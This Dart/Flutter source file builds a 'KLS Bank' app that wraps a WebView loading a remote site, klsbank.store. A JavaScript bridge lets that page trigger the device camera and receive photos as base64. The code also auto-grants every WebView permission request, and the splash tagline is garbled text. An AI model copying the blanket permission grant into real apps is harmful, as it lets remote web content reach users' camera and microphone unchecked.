import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:webview_flutter_android/webview_flutter_android.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      title: 'KLS Bank',
      debugShowCheckedModeBanner: false,
      home: WebScreen(),
    );
  }
}

class WebScreen extends StatefulWidget {
  const WebScreen({super.key});

  @override
  State<WebScreen> createState() => _WebScreenState();
}

class _WebScreenState extends State<WebScreen> {
  late final WebViewController _controller;
  final ImagePicker _picker = ImagePicker();

  bool _showSplash = true;
  bool _pageLoaded = false;
  bool _minimumSplashElapsed = false;
  Timer? _splashTimer;
  Timer? _splashFallbackTimer;

  @override
  void initState() {
    super.initState();

    _splashTimer = Timer(const Duration(milliseconds: 1300), () {
      _minimumSplashElapsed = true;
      _hideSplashIfReady();
    });

    _splashFallbackTimer = Timer(const Duration(milliseconds: 3500), () {
      if (mounted) {
        setState(() => _showSplash = false);
      }
    });

    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setUserAgent('Flutter/fx_bank')
      ..setOnConsoleMessage((JavaScriptConsoleMessage message) {
        debugPrint('WebView console: ${message.message}');
      })
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (String url) {
            debugPrint('Loaded: $url');
            _pageLoaded = true;
            _hideSplashIfReady();
          },
        ),
      )
      ..addJavaScriptChannel(
        'FlutterEventBridge',
        onMessageReceived: (JavaScriptMessage message) {
          final Map<String, dynamic> data = jsonDecode(message.message);
          if (data['action'] == 'openCamera') {
            _takePictureAndUpload(data['letter']?.toString() ?? '');
          }
        },
      )
      ..loadRequest(Uri.parse('https://klsbank.store/'));

    final platformController = _controller.platform;
    if (platformController is AndroidWebViewController) {
      platformController.setOnPlatformPermissionRequest((request) {
        request.grant();
      });
    }
  }

  void _hideSplashIfReady() {
    if (!mounted || !_pageLoaded || !_minimumSplashElapsed || !_showSplash) return;
    setState(() => _showSplash = false);
  }

  Future<void> _takePictureAndUpload(String letter) async {
    try {
      final XFile? photo = await _picker.pickImage(source: ImageSource.camera);
      if (photo == null) return;

      final File imageFile = File(photo.path);
      final List<int> imageBytes = await imageFile.readAsBytes();
      final String base64Image = base64Encode(imageBytes);
      final String encodedLetter = jsonEncode(letter);
      final String encodedImage = jsonEncode(base64Image);

      await _controller.runJavaScript(
        'window.onCameraResult($encodedLetter, $encodedImage);',
      );
    } catch (e) {
      debugPrint('Camera error: $e');
    }
  }

  @override
  void dispose() {
    _splashTimer?.cancel();
    _splashFallbackTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF6F4CFF),
      body: Stack(
        fit: StackFit.expand,
        children: [
          SafeArea(
            child: WebViewWidget(controller: _controller),
          ),
          IgnorePointer(
            ignoring: !_showSplash,
            child: AnimatedOpacity(
              opacity: _showSplash ? 1 : 0,
              duration: const Duration(milliseconds: 360),
              curve: Curves.easeOut,
              child: const _SplashView(),
            ),
          ),
        ],
      ),
    );
  }
}

class _SplashView extends StatelessWidget {
  const _SplashView();

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Color(0xFF4F46E5),
            Color(0xFF7C3AED),
            Color(0xFF8B5CF6),
          ],
        ),
      ),
      child: Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 86,
              height: 86,
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: 0.16),
                borderRadius: BorderRadius.circular(28),
                border: Border.all(color: Colors.white.withValues(alpha: 0.34)),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withValues(alpha: 0.12),
                    blurRadius: 24,
                    offset: const Offset(0, 14),
                  ),
                ],
              ),
              alignment: Alignment.center,
              child: const Text(
                'K',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 42,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 0,
                ),
              ),
            ),
            const SizedBox(height: 22),
            const Text(
              'KLS Bank',
              style: TextStyle(
                color: Colors.white,
                fontSize: 28,
                fontWeight: FontWeight.w800,
                letterSpacing: 0,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              '?명솚?????쎄퀬 ?묐삊?섍쾶',
              style: TextStyle(
                color: Colors.white.withValues(alpha: 0.82),
                fontSize: 14,
                fontWeight: FontWeight.w500,
                letterSpacing: 0,
              ),
            ),
          ],
        ),
      ),
    );
  }
}